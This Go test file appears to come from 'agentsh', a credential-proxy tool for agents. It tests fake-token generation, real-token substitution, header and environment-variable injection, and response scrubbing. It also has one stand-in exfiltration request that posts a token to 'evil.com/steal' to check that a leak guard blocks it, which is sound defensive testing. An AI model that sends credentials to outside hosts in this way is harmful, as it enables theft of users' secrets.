package session

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/agentsh/agentsh/internal/policy"
	"github.com/agentsh/agentsh/internal/proxy"
	"github.com/agentsh/agentsh/internal/proxy/secrets"
	"github.com/agentsh/agentsh/internal/proxy/services"
)

func TestCredentialPipeline_EndToEnd(t *testing.T) {
	// Set up a memory provider with a known secret.
	realSecret := []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456")
	mp := &memoryProvider{
		secrets: map[string][]byte{
			"github/token": realSecret,
		},
	}

	services := []ServiceConfig{
		{
			Name:       "github",
			SecretRef:  secrets.SecretRef{Scheme: "memory", Host: "github", Path: "token"},
			FakeFormat: "ghp_{rand:36}",
		},
	}

	// Bootstrap credentials.
	table, cleanup, err := BootstrapCredentials(context.Background(), mp, services)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// Get the fake that was generated.
	fake, ok := table.FakeForService("github")
	if !ok {
		t.Fatal("no fake for github")
	}

	// Verify fake->real substitution.
	reqBody := []byte(`{"token":"` + string(fake) + `"}`)
	replaced := table.ReplaceFakeToReal(reqBody)
	wantReq := []byte(`{"token":"` + string(realSecret) + `"}`)
	if !bytes.Equal(replaced, wantReq) {
		t.Errorf("ReplaceFakeToReal:\n  got:  %s\n  want: %s", replaced, wantReq)
	}

	// Verify real->fake scrubbing.
	respBody := []byte(`{"echoed":"` + string(realSecret) + `"}`)
	scrubbed := table.ReplaceRealToFake(respBody)
	wantResp := []byte(`{"echoed":"` + string(fake) + `"}`)
	if !bytes.Equal(scrubbed, wantResp) {
		t.Errorf("ReplaceRealToFake:\n  got:  %s\n  want: %s", scrubbed, wantResp)
	}

	// Verify leak guard detects fake in body.
	serviceName, found := table.ContainsFake(reqBody)
	if !found {
		t.Error("ContainsFake should detect fake in request body")
	}
	if serviceName != "github" {
		t.Errorf("serviceName = %q, want %q", serviceName, "github")
	}

	// Verify no false positive.
	cleanBody := []byte(`{"message":"hello world"}`)
	_, found = table.ContainsFake(cleanBody)
	if found {
		t.Error("ContainsFake should not flag clean body")
	}
}

func TestIntegration_PolicyYAML_FullFlow(t *testing.T) {
	// Setup: create a memory provider with a known secret.
	memProvider := &memoryProvider{
		secrets: map[string][]byte{
			"agentsh/github_token": []byte("ghp_REAL1234567890abcdef12345678901234"),
		},
	}

	// Exercise resolver path to verify YAML→config wiring.
	yamlServices := []policy.ServiceYAML{
		{
			Name:   "github",
			Match:  policy.ServiceMatchYAML{Hosts: []string{"api.github.com"}},
			Secret: policy.ServiceSecretYAML{Ref: "keyring://agentsh/github_token"},
			Fake:   policy.ServiceFakeYAML{Format: "ghp_{rand:34}"},
			Inject: policy.ServiceInjectYAML{Header: &policy.ServiceInjectHeaderYAML{
				Name: "Authorization", Template: "Bearer {{secret}}",
			}},
		},
	}
	resolved, err := ResolveServiceConfigs(yamlServices)
	if err != nil {
		t.Fatalf("ResolveServiceConfigs: %v", err)
	}

	// Bootstrap credentials.
	table, cleanup, err := BootstrapCredentials(context.Background(), memProvider, resolved.ServiceConfigs)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// Verify fake was generated and is in the table.
	fake, ok := table.FakeForService("github")
	if !ok {
		t.Fatal("no fake for github")
	}

	// Build matcher from resolved patterns.
	matcher := services.NewMatcher(resolved.Patterns)

	// Verify host matching.
	name, matched := matcher.Match("api.github.com")
	if !matched || name != "github" {
		t.Fatalf("Match(api.github.com) = (%q, %v)", name, matched)
	}

	// Verify fake→real substitution.
	body := []byte(fmt.Sprintf(`{"token":"%s"}`, fake))
	replaced := table.ReplaceFakeToReal(body)
	if !bytes.Contains(replaced, []byte("ghp_REAL1234567890abcdef12345678901234")) {
		t.Errorf("body not substituted: %s", replaced)
	}
	if bytes.Contains(replaced, fake) {
		t.Errorf("fake still present after substitution: %s", replaced)
	}

	// Verify header injection using resolved InjectHeaders.
	if len(resolved.InjectHeaders) == 0 {
		t.Fatal("expected at least one InjectHeader from resolved config")
	}
	ih := resolved.InjectHeaders[0]
	hook := proxy.NewHeaderInjectionHook(ih.ServiceName, ih.HeaderName, ih.Template, table)
	req := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos", nil)
	if err := hook.PreHook(req, &proxy.RequestContext{ServiceName: "github"}); err != nil {
		t.Fatal(err)
	}
	authHeader := req.Header.Get("Authorization")
	if authHeader != "Bearer ghp_REAL1234567890abcdef12345678901234" {
		t.Errorf("Authorization = %q, want Bearer ghp_REAL...", authHeader)
	}

	// Verify real→fake scrubbing on response.
	respBody := []byte(`{"echoed":"ghp_REAL1234567890abcdef12345678901234"}`)
	scrubbed := table.ReplaceRealToFake(respBody)
	if !bytes.Contains(scrubbed, fake) {
		t.Errorf("response not scrubbed: %s", scrubbed)
	}
	if bytes.Contains(scrubbed, []byte("ghp_REAL1234567890abcdef12345678901234")) {
		t.Errorf("real credential still present after scrubbing: %s", scrubbed)
	}

	// Verify leak guard allows matched service's own fake.
	leakGuard := proxy.NewLeakGuardHook(table, slog.Default())
	leakReq := httptest.NewRequest(http.MethodPost, "http://api.github.com/repos",
		bytes.NewReader([]byte(fmt.Sprintf(`{"t":"%s"}`, fake))))
	err = leakGuard.PreHook(leakReq, &proxy.RequestContext{ServiceName: "github"})
	if err != nil {
		t.Errorf("LeakGuard should allow matched service's own fake: %v", err)
	}

	// Verify leak guard blocks unmatched host.
	leakReq2 := httptest.NewRequest(http.MethodPost, "http://evil.com/steal",
		bytes.NewReader([]byte(fmt.Sprintf(`{"t":"%s"}`, fake))))
	err = leakGuard.PreHook(leakReq2, &proxy.RequestContext{})
	if err == nil {
		t.Error("LeakGuard should block fakes to unmatched hosts")
	}
}

func TestEnvVarInjection_CompositionFlow(t *testing.T) {
	// 1. Define service YAML with inject.env and scrub_response.
	svcs := []policy.ServiceYAML{
		{
			Name:          "github",
			Match:         policy.ServiceMatchYAML{Hosts: []string{"api.github.com"}},
			Secret:        policy.ServiceSecretYAML{Ref: "keyring://agentsh/gh"},
			Fake:          policy.ServiceFakeYAML{Format: "ghp_{rand:36}"},
			ScrubResponse: true,
			Inject: policy.ServiceInjectYAML{
				Header: &policy.ServiceInjectHeaderYAML{
					Name: "Authorization", Template: "Bearer {{secret}}",
				},
				Env: []policy.ServiceInjectEnvYAML{
					{Name: "GITHUB_TOKEN"},
					{Name: "GH_TOKEN"},
				},
			},
		},
		{
			Name:   "stripe",
			Match:  policy.ServiceMatchYAML{Hosts: []string{"api.stripe.com"}},
			Secret: policy.ServiceSecretYAML{Ref: "keyring://agentsh/stripe"},
			Fake:   policy.ServiceFakeYAML{Format: "xk_test_{rand:24}"},
			Inject: policy.ServiceInjectYAML{
				Env: []policy.ServiceInjectEnvYAML{
					{Name: "STRIPE_API_KEY"},
				},
			},
			// ScrubResponse intentionally false
		},
	}

	// 2. Resolve services.
	resolved, err := ResolveServiceConfigs(svcs)
	if err != nil {
		t.Fatalf("ResolveServiceConfigs: %v", err)
	}

	// Verify env vars resolved.
	if len(resolved.EnvVars) != 3 {
		t.Fatalf("expected 3 env vars, got %d", len(resolved.EnvVars))
	}

	// Verify scrub config.
	if !resolved.ScrubServices["github"] {
		t.Error("github should be in ScrubServices")
	}
	if resolved.ScrubServices["stripe"] {
		t.Error("stripe should NOT be in ScrubServices")
	}
	// ScrubServices should be non-nil (services are configured).
	if resolved.ScrubServices == nil {
		t.Fatal("ScrubServices should be non-nil")
	}

	// 3. Bootstrap credentials with a memory provider.
	mp := &memoryProvider{
		secrets: map[string][]byte{
			"agentsh/gh":     []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456"),
			"agentsh/stripe": []byte("xk_test_realABCDEFGHIJKLMNOPQRST"),
		},
	}
	table, cleanup, err := BootstrapCredentials(context.Background(), mp, resolved.ServiceConfigs)
	if err != nil {
		t.Fatalf("BootstrapCredentials: %v", err)
	}
	defer cleanup()

	// 4. Build service env vars.
	svcEnv, envErr := BuildServiceEnvVars(resolved.EnvVars, table)
	if envErr != nil {
		t.Fatalf("BuildServiceEnvVars: %v", envErr)
	}
	if len(svcEnv) != 3 {
		t.Fatalf("expected 3 service env vars, got %d", len(svcEnv))
	}
	if _, ok := svcEnv["GITHUB_TOKEN"]; !ok {
		t.Error("GITHUB_TOKEN missing from service env vars")
	}
	if _, ok := svcEnv["GH_TOKEN"]; !ok {
		t.Error("GH_TOKEN missing from service env vars")
	}
	if _, ok := svcEnv["STRIPE_API_KEY"]; !ok {
		t.Error("STRIPE_API_KEY missing from service env vars")
	}

	// Verify env var values are the fake credentials.
	ghFake, _ := table.FakeForService("github")
	if svcEnv["GITHUB_TOKEN"] != string(ghFake) {
		t.Errorf("GITHUB_TOKEN value doesn't match fake")
	}
	// Both GITHUB_TOKEN and GH_TOKEN should have the same fake (same service).
	if svcEnv["GH_TOKEN"] != string(ghFake) {
		t.Errorf("GH_TOKEN value doesn't match fake")
	}

	// 5. Collision detection: no collision.
	envInject := map[string]string{"PATH": "/usr/bin"}
	if err := CheckEnvCollisions(svcEnv, envInject); err != nil {
		t.Fatalf("unexpected collision: %v", err)
	}

	// 6. Collision detection: collision.
	envInjectBad := map[string]string{"GITHUB_TOKEN": "something_else"}
	if err := CheckEnvCollisions(svcEnv, envInjectBad); err == nil {
		t.Error("expected collision error")
	}

	// 7. Scrub toggle: github has scrub_response=true, stripe does not.
	credsHook := proxy.NewCredsSubHook(table, resolved.ScrubServices)

	// Response from github should be scrubbed (real -> fake).
	ghRespBody := []byte(`{"echoed":"ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456"}`)
	ghResp := &http.Response{
		Body:          io.NopCloser(bytes.NewReader(ghRespBody)),
		ContentLength: int64(len(ghRespBody)),
	}
	if err := credsHook.PostHook(ghResp, &proxy.RequestContext{ServiceName: "github"}); err != nil {
		t.Fatalf("PostHook github: %v", err)
	}
	ghGot, _ := io.ReadAll(ghResp.Body)
	if bytes.Contains(ghGot, []byte("ghp_realABCDEFGHIJKLMNOPQRSTUVWXYZ123456")) {
		t.Error("github response should have real credential scrubbed")
	}

	// Response from stripe should NOT be scrubbed (scrub_response not set).
	stripeRespBody := []byte(`{"echoed":"xk_test_realABCDEFGHIJKLMNOPQRST"}`)
	stripeResp := &http.Response{
		Body:          io.NopCloser(bytes.NewReader(stripeRespBody)),
		ContentLength: int64(len(stripeRespBody)),
	}
	if err := credsHook.PostHook(stripeResp, &proxy.RequestContext{ServiceName: "stripe"}); err != nil {
		t.Fatalf("PostHook stripe: %v", err)
	}
	stripeGot, _ := io.ReadAll(stripeResp.Body)
	if !bytes.Contains(stripeGot, []byte("xk_test_realABCDEFGHIJKLMNOPQRST")) {
		t.Error("stripe response should NOT be scrubbed (scrub_response not set)")
	}
}
